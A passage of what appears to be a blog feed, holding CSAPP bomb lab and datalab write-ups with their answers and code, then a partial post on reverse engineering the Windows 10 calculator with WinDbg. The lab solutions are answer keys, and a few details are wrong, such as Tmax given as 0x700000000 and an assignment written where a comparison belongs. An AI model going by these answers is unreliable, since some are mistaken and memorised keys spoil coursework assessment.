half byte as the index to get the characters in the array. If the output of those character become <code>flyers</code>, you defuse the bomb.</p><p>The encryption&#x2F;decryption array:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unsigned char array_3449[] =</span><br><span class="line">&#123;</span><br><span class="line">  0x6D, 0x61, 0x64, 0x75, 0x69, 0x65, 0x72, 0x73, 0x6E, 0x66, </span><br><span class="line">  0x6F, 0x74, 0x76, 0x62, 0x79, 0x6C</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ionefg</span><br></pre></td></tr></table></figure><h2 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase 6"></a>Phase 6</h2><p>Phase 6 read in 6 numbers. First, there are two nested loop to make sure every input number is less or equal to 6, and there are no number that next to each other are equal. Ex:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 3 4 6 9 2(X) because 9 &gt; 6</span><br><span class="line">1 3 6 6 2 4(X) because 6 = 6 and they are next to each other</span><br></pre></td></tr></table></figure><p>Then there is a second loop use 7 minus each input number and store the value in the same position as the original input. </p><p>The third loop initialize the “node” for the next loop. There are 6 nodes in total (also 6 input).  </p><p>The fourth loop set up the pointer for each “node” by the sequence of the input. Similar to an object, the “node” here have 8 byte to store their own value and another 8 byte point to another node. </p><p>The last loop examine the “node chain” to make sure it is in decreasing or same order.  </p><p>After debugging, the pointing direction should be:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node3 -&gt; node4 -&gt; node5 -&gt; node6 -&gt; node1 -&gt; node2</span><br></pre></td></tr></table></figure><p>The solution should be (remember, the second loop reverse the inputs if we choose not to have repeated number):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure><h2 id="Secret-Phase"><a href="#Secret-Phase" class="headerlink" title="Secret Phase"></a>Secret Phase</h2><p>If we take a specific look at the <code>phase_defused</code> function, we can see that if the <code>num_input_strings</code>, which counting the number of inputs, equal to 6, another branch will open up. </p><p>After dynamic analysis, the new branch in the <code>phase_defused</code> function redo the <code>sscanf</code> function on the input of phase 4:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sscanf</span>(PHASE_4_str, <span class="string">&quot;%d %d %s&quot;</span>, rdx, rcx, r8);</span><br></pre></td></tr></table></figure><p>Then compare the contents of the last string with <code>DrEvil</code>. If equal, the checks passed, successfully into the secrete phase. But as it said: <code>But finding it and solving it are quite different...</code></p><p>The secret phase read in string and convert it to long int. The value after convert should less than 1000. Then call the <code>fun7</code>, another recursive function, with the parameter of <code>char *a1, input_val</code>. <code>a1</code> is an array in the program <code>.data</code> section, which we are able to access by disassembler. The return value of <code>fun7</code> should equal to 2, then we defuse the secret phase. </p><p>There are two recursive branches for <code>fun7</code>. The whole <code>fun7</code> looks like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// error case</span></span><br><span class="line"><span class="keyword">if</span> (!a1)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// base case</span></span><br><span class="line"><span class="keyword">if</span> (*a1 = a2)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// recursive branches</span></span><br><span class="line"><span class="keyword">if</span> (*a1 &gt; a2)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * fun7(*(a1 + <span class="number">0x8</span>), input_val);</span><br><span class="line"><span class="keyword">if</span> (*a1 &lt; a2)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * fun7(*(a1 + <span class="number">0x10</span>), input_val) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p> So in order to make the the return value to be 2, we may go in the first branch for first call, go in the second branch for second call, and terminate the recursion for third call. </p><p>After examine the array, we can easily find the solution for the secret phase follow the procedure above. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Project Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP datalab</title>
      <link href="/2022/05/19/CSAPP-datalab/"/>
      <url>/2022/05/19/CSAPP-datalab/</url>
      
        <content type="html"><![CDATA[<p>This is the writeup for CSAPP datalab</p><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><p><code>XOR</code> gate can be composed by couple <code>NAND</code> gate. Use legal ops <code>~ &amp;</code> to construct <code>NAND</code> gate to get <code>XOR</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="comment">/* Use ~ and &amp; constuct NAND gate to calculate XOR */</span></span><br><span class="line">    <span class="type">int</span> temp = ~(x &amp; y);</span><br><span class="line">    <span class="type">int</span> a = ~(x &amp; temp);</span><br><span class="line">    <span class="type">int</span> b = ~(y &amp; temp);</span><br><span class="line">    <span class="type">int</span> result = ~(a &amp; b);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>$T_{min}$ is <code>0x80000000 = 0b1000...0</code>. Do bit shift on 1 will get the correct result</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* Tmin is 0b1000...0, so doing bit shift on 1 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><p>$T_{max}$ is <code>0x700000000 = 0b0111...1</code>, which is $T_{min} &#x3D; T_{max} + 1$. Also, we know that $T_{min} + T_{max} &#x3D; 0$. So we may use this advantage to solve the puzzle. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="comment">/* Tmax is 0b0111...1, it is Tmin - 1. Tmin + Tmax = 1 */</span></span><br><span class="line">    <span class="keyword">return</span> !(~((x + <span class="number">1</span>) + x) | !(x + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><p>To satisfy the requirement of having all odd bits to be 1, the simplest number is <code>0xAAAAAAAA = 0b1010...1010</code>.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="comment">/* The simplest number satisfied the requirement is 0xAAA..A, so make it and do comparision */</span></span><br><span class="line">    <span class="type">int</span> temp = <span class="number">0xAA</span>;</span><br><span class="line">    <span class="type">int</span> oddBits = temp &lt;&lt; <span class="number">24</span>;</span><br><span class="line">    oddBits += temp &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    oddBits += temp &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    oddBits += temp;</span><br><span class="line">    <span class="keyword">return</span> !((x &amp; oddBits) ^ oddBits);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>Doing two’s complement negation. Use negate operator then add 1. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="comment">/* Doing two&#x27;s complement negation */</span></span><br><span class="line">    <span class="type">int</span> result = ~x;</span><br><span class="line">    result += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h2><p>Make sure it range from <code>0x30 ~ 0x39 (inclusive)</code> which means that <code>(x - 0x30) &gt;= 0 &amp;&amp; (0x39 - x) &gt;= 0</code>. So implement this into code. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">/* (x - 0x30 &gt;= 0) &amp;&amp; (0x39 - x) &gt;=0 */</span></span><br><span class="line">  <span class="type">int</span> NEG = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> !((x + ~<span class="number">0x30</span> + <span class="number">1</span>) &amp; NEG) &amp; !((<span class="number">0x39</span> + ~x + <span class="number">1</span>) &amp; NEG);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><p>We may use <code>!!</code> to identify if <code>x</code> is not 0. When <code>x</code> is not 0, we should have <code>y</code> side identifier to be <code>0xfff...f</code> and <code>z</code> side to be <code>0x0</code>, and when <code>x</code> is 0 vise versa. Therefore, it only satisfy one side of <code>|</code> operator, other side will be 0. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">    <span class="comment">/* Use ~(!!x) + 1 as identifier to make sure it only satisfy one side, other side is 0*/</span></span><br><span class="line">    <span class="type">int</span> temp = ~(!!x) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (temp &amp; y) | (~temp &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><p>Solve the problem case by case</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="comment">/* Solve it case by case. Check the sign of x and y */</span></span><br><span class="line">    <span class="type">int</span> signX = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="type">int</span> signY = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> (signX &amp; !signY) | (!(signX ^ signY) &amp; !((y + ~x + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h2><p>There are two number that is same as itself after the negation, $T_{min}$ and 0. But 0 always “positive” (most significant bit is 0).</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="comment">/* 0 is the only number that is &quot;positive&quot; after its negation */</span></span><br><span class="line">    <span class="type">int</span> negX = ~x + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> result = ((x &gt;&gt; <span class="number">31</span>) | (negX &gt;&gt; <span class="number">31</span>)) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="howManyBits"><a href="#howManyBits" class="headerlink" title="*howManyBits"></a>*howManyBits</h2><p>I have no idea how to implement this except for stupid enumeration. I find a solution instead. </p><p>The solution first flip the sign of the input if it is negative. Then, it doing a binary search on the processed input. <strong>Key here on the binary search is that he shift the input based on what it get.</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> sign, b1, b2, b4, b8, b16;</span><br><span class="line">  sign = (x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">  x = (sign &amp; ~x) | (~sign &amp; x);</span><br><span class="line">  b16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  x = x &gt;&gt; b16;</span><br><span class="line">  b8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  x = x &gt;&gt; b8;</span><br><span class="line">  b4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x = x &gt;&gt; b4;</span><br><span class="line">  b2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x = x &gt;&gt; b2;</span><br><span class="line">  b1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x = x &gt;&gt; b1;</span><br><span class="line">  <span class="keyword">return</span> b16 + b8 + b4 + b2 + b1 + x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h2><p>In floating point part, we are allowed to use <code>if, while</code> those branch and loop, which is much easier than stuffs above. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> frac = (uf &lt;&lt; <span class="number">9</span>) &gt;&gt; <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="built_in">exp</span> = (uf &lt;&lt; <span class="number">1</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    <span class="type">unsigned</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if NaN or infinity</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">exp</span> += <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        frac &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (sign &lt;&lt; <span class="number">31</span>) + (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) + frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="float-Float2Int"><a href="#float-Float2Int" class="headerlink" title="float Float2Int"></a>float Float2Int</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> frac = (uf &lt;&lt; <span class="number">9</span>) &gt;&gt; <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> <span class="built_in">exp</span> = (uf &lt;&lt; <span class="number">1</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    <span class="type">int</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 representation</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span> &amp;&amp; frac == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exp</span> -= <span class="number">127</span>;</span><br><span class="line">    result = <span class="number">1</span> &lt;&lt; <span class="built_in">exp</span>;</span><br><span class="line">    <span class="comment">// overflow</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &gt; <span class="number">31</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0.???...</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &gt; <span class="number">23</span>)&#123;</span><br><span class="line">        result += frac &lt;&lt; (<span class="built_in">exp</span> - <span class="number">23</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result += frac &gt;&gt; (<span class="number">23</span> - <span class="built_in">exp</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sign)&#123;</span><br><span class="line">        result = ~result + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> INF = <span class="number">0xff</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">    <span class="type">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="comment">// overflow</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &gt;= <span class="number">255</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> INF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0.00000??...</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Project Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10 UWP Calculator</title>
      <link href="/2022/04/17/Win10-UWP-Calculator/"/>
      <url>/2022/04/17/Win10-UWP-Calculator/</url>
      
        <content type="html"><![CDATA[<p><strong>Goals:</strong> </p><ul><li>Make the win10 UWP calculator 1+1&#x3D;3</li><li>Reverse engineering the win10 UWP calculator, understand all (at least most) functionalities.</li></ul><h2 id="What-is-UWP"><a href="#What-is-UWP" class="headerlink" title="What is UWP?"></a>What is UWP?</h2><p><strong>Universal Windows Platform</strong> (<strong>UWP</strong>) is a <a href="https://en.wikipedia.org/wiki/Computing_platform">computing platform</a> created by <a href="https://en.wikipedia.org/wiki/Microsoft">Microsoft</a> and first introduced in <a href="https://en.wikipedia.org/wiki/Windows_10">Windows 10</a>. The purpose of this platform is to help develop <a href="https://en.wikipedia.org/wiki/Universal_app">universal apps</a> that run on Windows 10, <a href="https://en.wikipedia.org/wiki/Windows_10_Mobile">Windows 10 Mobile</a>, <a href="https://en.wikipedia.org/wiki/Windows_11">Windows 11</a>, <a href="https://en.wikipedia.org/wiki/Xbox_system_software">Xbox One</a>, <a href="https://en.wikipedia.org/wiki/Xbox_system_software">Xbox Series X&#x2F;S</a> and <a href="https://en.wikipedia.org/wiki/Microsoft_HoloLens">HoloLens</a> without the need to be <a href="https://en.wikipedia.org/wiki/Porting">rewritten for each</a>. It supports <a href="https://en.wikipedia.org/wiki/Microsoft_Windows">Windows</a> app development using <a href="https://en.wikipedia.org/wiki/C%2B%2B">C++</a>, <a href="https://en.wikipedia.org/wiki/C_Sharp_(programming_language)">C#</a>, <a href="https://en.wikipedia.org/wiki/VB.NET">VB.NET</a>, and <a href="https://en.wikipedia.org/wiki/XAML">XAML</a>. The <a href="https://en.wikipedia.org/wiki/Application_programming_interface">API</a> is implemented in C++, and supported in C++, VB.NET, C#, <a href="https://en.wikipedia.org/wiki/F_Sharp_(programming_language)">F#</a> and <a href="https://en.wikipedia.org/wiki/JavaScript">JavaScript</a>.[<a href="https://en.wikipedia.org/wiki/Universal_Windows_Platform#cite_note-MicrosoftWhatIs-1">1]</a> Designed as an extension to the <a href="https://en.wikipedia.org/wiki/Windows_Runtime">Windows Runtime (WinRT)</a> platform first introduced in <a href="https://en.wikipedia.org/wiki/Windows_Server_2012">Windows Server 2012</a> and <a href="https://en.wikipedia.org/wiki/Windows_8">Windows 8</a>, UWP allows developers to create apps that will potentially run on multiple types of devices. (From Wikipedia)</p><p>UWP application usually installed under the directory of <code>C:\Program Files\windowsapp</code>. Usually, users, even administrator, don’t have the permission of editing the files under that directory. </p><h2 id="Dynamic-Analysis-Based-on-Data-Flow"><a href="#Dynamic-Analysis-Based-on-Data-Flow" class="headerlink" title="Dynamic Analysis Based on Data Flow"></a>Dynamic Analysis Based on Data Flow</h2><h3 id="Anchor-in-the-memory"><a href="#Anchor-in-the-memory" class="headerlink" title="Anchor in the memory"></a>Anchor in the memory</h3><p>Set the calculation result to a wired number, suppose they are store in somewhere in the memory in hex format (experience from win32 calc), break the program by windbg and search through the memory to see where it is. The result might be complicate, but after identified some key characteristics of the data, only a few of them “might” be the correct value we want. Here I use “yy” in ascii form and 31097 for decimal value to test the memory. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s -a 0 L?fffffffffff &quot;yy&quot;</span><br><span class="line">or</span><br><span class="line">s -q 0 L?fffffffffff 0x00007979</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403154256266.png" data-caption="image-20220403154256266"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403154256266.png" alt="image-20220403154256266"></a></p><p>Then, assign them with different value in the memory and continue run the calculator. Base on different value we assigned to them, we can easily identify which memory location is the real one. 31097 + 1 will never results 31105, therefore, we found the correct memory location. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed 0000014a`91a83bd0 0000000000007980</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403154645935.png" data-caption="image-20220403154645935"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403154645935.png" alt="image-20220403154645935"></a></p><h3 id="Who-touches-my-anchor"><a href="#Who-touches-my-anchor" class="headerlink" title="Who touches my anchor?"></a>Who touches my anchor?</h3><p>Set up breakpoint on that memory location when any code read it.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ba r 2 0000014a`91a83bd0</span><br></pre></td></tr></table></figure><p>Then when the calculator is running and hitting the <strong>“+” button</strong>, the program hit the break point with stack organization (also the control flow) shown as below. </p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/Snipaste_2022-04-03_15-25-07.png" data-caption="Snipaste_2022-04-03_15-25-07"><img src="/2022/04/17/Win10-UWP-Calculator/assets/Snipaste_2022-04-03_15-25-07.png" alt="Snipaste_2022-04-03_15-25-07"></a></p><p>The current function call is in the library(like “printf” function for c code in stdio.h), ignore that. Step out the current function and examine the code. </p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403161157003.png" data-caption="image-20220403161157003"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403161157003.png" alt="image-20220403161157003"></a></p><p>Locate it in the IDA, combine the dynamic analysis stack contents, the **a1 is a double pointer of one of the number we want to add. We guess that **a2 <strong>could be</strong> another double pointer which points to the number we want to add (Not add yet, this breakpoint happened just after we push the button “+”) </p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403161439426.png" data-caption="image-20220403161439426"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403161439426.png" alt="image-20220403161439426"></a></p><p>The whole control flow is shown in the below:</p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403170537010.png" data-caption="image-20220403170537010"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403170537010.png" alt="image-20220403170537010"></a></p><p>After figure out the control flow of the “+” button, another button will also cause the break point, <strong>“&#x3D;” button</strong>. Using same idea, drag out the control flow of the “&#x3D;” button. </p><p><a data-fancybox="gallery" data-src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403171802888.png" data-caption="image-20220403171802888"><img src="/2022/04/17/Win10-UWP-Calculator/assets/image-20220403171802888.png" alt="image-20220403171802888"></a></p><p>It is worth noting that this function manipulates both input we use to add the number. </p><p><a data-fancybox="gallery" 